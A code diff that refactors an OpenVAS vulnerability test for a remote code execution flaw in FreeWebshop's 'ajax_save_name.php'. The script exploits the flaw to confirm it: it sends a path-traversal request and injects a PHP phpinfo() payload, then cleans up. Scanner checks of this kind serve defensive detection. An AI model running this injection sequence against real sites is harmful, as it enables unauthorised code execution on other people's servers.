@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_freewebshop_50694.nasl 7052 2017-09-04 11:50:51Z teissa $
+# $Id: gb_freewebshop_50694.nasl 7573 2017-10-26 09:18:50Z cfischer $
 #
 # FreeWebshop 'ajax_save_name.php' Remote Code Execution Vulnerability
 #
@@ -41,7 +41,7 @@ if (description)
 {
  script_oid(SCRIPT_OID);
  script_bugtraq_id(50694);
- script_version ("$Revision: 7052 $");
+ script_version ("$Revision: 7573 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("FreeWebshop 'ajax_save_name.php' Remote Code Execution Vulnerability");
@@ -49,7 +49,7 @@ if (description)
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50694");
  script_xref(name : "URL" , value : "http://www.freewebshop.org");
 
- script_tag(name:"last_modification", value:"$Date: 2017-09-04 13:50:51 +0200 (Mon, 04 Sep 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-10-26 11:18:50 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2011-11-17 08:34:17 +0100 (Thu, 17 Nov 2011)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
@@ -67,9 +67,7 @@ include("host_details.inc");
 include("http_keepalive.inc");
 include("version_func.inc");
    
-if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
-
-function random_mkdir() {
+function random_mkdir(dir) {
 
   local_var payload;
 
@@ -95,9 +93,7 @@ function random_mkdir() {
 
 }  
 
-if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);
-
-function exploit(ex) {
+function exploit(ex, dir) {
 
   payload = string("selectedDoc[]=",ex,"&currentFolderPath=../../../up/");
   host = get_host_name();
@@ -118,7 +114,7 @@ function exploit(ex) {
   if(isnull(session_id[1]))exit(0);
   sess = session_id[1];
 
-  dirname = random_mkdir();
+  dirname = random_mkdir(dir:dir);
   newname = rand();
   payload = "value=" + newname + "&id=../../../up/" + dirname;
 
@@ -144,11 +140,14 @@ function exploit(ex) {
 
 }  
 
-buf = exploit(ex:"<?php phpinfo(); die; ?>");
+if(!port = get_app_port(cpe:CPE))exit(0);
+if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
+
+buf = exploit(ex:"<?php phpinfo(); die; ?>", dir:dir);
 
 if("<title>phpinfo()" >< buf) {
 
-  exploit(ex:""); # clean data.php
+  exploit(ex:"", dir:dir); # clean data.php
   security_message(port:port);
   exit(0);
 
